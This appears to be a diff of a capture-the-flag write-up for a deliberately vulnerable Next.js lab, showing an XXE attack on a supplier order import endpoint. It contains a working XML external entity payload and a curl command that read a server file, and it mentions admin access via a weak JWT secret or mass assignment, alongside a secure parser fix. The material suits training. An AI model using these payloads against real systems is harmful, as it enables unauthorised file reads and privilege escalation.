@@ -2,7 +2,7 @@
 author: kOaDT
 authorGithubUrl: https://github.com/kOaDT
 authorGithubAvatar: https://avatars.githubusercontent.com/u/17499022?v=4
-pubDatetime: 2026-02-17T08:00:00Z
+pubDatetime: 2026-02-18T08:00:00Z
 title: "XML External Entity Injection: Exploiting a Legacy Supplier Import Endpoint"
 slug: xxe-supplier-order-import
 draft: false
@@ -34,21 +34,13 @@ Once Next.js has started, the application is accessible at `http://localhost:300
 
 The supplier order import feature is restricted to administrators. Before exploiting the XXE vulnerability, admin access must be obtained through another vulnerability.
 
-One approach is to forge a JWT token. The application uses `HS256` with a weak secret (`secret`). Using any JWT tool:
-
-```bash
-# Decode an existing token from the authToken cookie
-# Modify the role to ADMIN
-# Re-sign with the secret "secret"
-```
-
-Alternatively, use mass assignment during signup by adding `"role": "ADMIN"` to the registration request body.
-
 ## Reconnaissance
 
 ### Discovering the supplier import page
 
 After gaining admin access, the admin dashboard at `/admin` displays navigation links to various management sections. Among them is "Supplier Orders," which links to `/admin/suppliers`.
+
+![Import Supplier Order](../../assets/images/xxe-supplier-order-import/import-supplier-order.png)
 
 The page provides a textarea for pasting XML and an "Import Order" button. A sample XML template is pre-filled:
 
@@ -86,7 +78,19 @@ The `notes` field is directly reflected from the XML input. This is the injectio
 
 ### Identifying the target file
 
-The server stores a supplier API configuration file at the project root. Its path can be discovered through error messages or by reading common configuration file names. The file is named `flag-xxe.txt`.
+Submitting malformed XML (e.g. missing required fields or an invalid structure) triggers verbose error responses. These include a `debug` object that leaks internal configuration, including the absolute path to a supplier registry file:
+
+```json
+{
+  "error": "Missing required fields: supplierId and orderId.",
+  "debug": {
+    "config": "/absolute/path/to/flag-xxe.txt",
+    "received": { "supplierId": null, "orderId": null }
+  }
+}
+```
+
+The file path points to `flag-xxe.txt` at the project root.
 
 ### Crafting the payload
 
@@ -95,7 +99,7 @@ XML supports Document Type Definitions (DTDs) that define entities. A `SYSTEM` e
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE order [
-  <!ENTITY xxe SYSTEM "file://flag-xxe.txt">
+  <!ENTITY xxe SYSTEM "file:///absolute/path/to/flag-xxe.txt">
 ]>
 <order>
   <supplierId>SUP-001</supplierId>
@@ -115,8 +119,10 @@ Submit the crafted XML via the import form or directly via curl:
 curl -X POST http://localhost:3000/api/admin/suppliers/import-order \
   -H "Content-Type: application/xml" \
   -H "Cookie: authToken=<your-admin-jwt>" \
-  -d '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file://flag-xxe.txt">]><order><supplierId>SUP-001</supplierId><orderId>PO-XXE</orderId><total>0</total><notes>&xxe;</notes></order>'
+  -d '<?xml version="1.0"?><!DOCTYPE order [<!ENTITY xxe SYSTEM "file:///absolute/path/to/flag-xxe.txt">]><order><supplierId>SUP-001</supplierId><orderId>PO-XXE</orderId><total>0</total><notes>&xxe;</notes></order>'
 ```
+
+![Flag](../../assets/images/xxe-supplier-order-import/flag-xxe.png)
 
 ### Reading the flag
 
@@ -136,11 +142,26 @@ The response includes the file contents in the `notes` field:
 
 The flag is `OSS{xml_3xt3rn4l_3nt1ty_1nj3ct10n}`.
 
+### Secure Implementation
+
+```typescript
+// VULNERABLE — resolves external entities from user input
+const doc = libxmljs.parseXmlString(rawXml, { noent: true, dtdload: true });
+
+// SECURE — disable DTD processing entirely
+const doc = libxmljs.parseXmlString(rawXml);
+// Additionally: strip or reject any DOCTYPE declarations before parsing
+```
+
+After the fix:
+
+![Fix](../../assets/images/xxe-supplier-order-import/fix-xxe.png)
+
 ## Vulnerability chain
 
 This exploit chains two vulnerabilities:
 
-1. **Admin access** — obtained via JWT forgery (CWE-347) or mass assignment (CWE-915)
+1. **Admin access** — obtained, for example, via JWT forgery (CWE-347) or mass assignment (CWE-915)
 2. **XXE injection (CWE-611)** — the XML parser resolves external entity declarations, allowing arbitrary file reads from the server
 
 ## Remediation
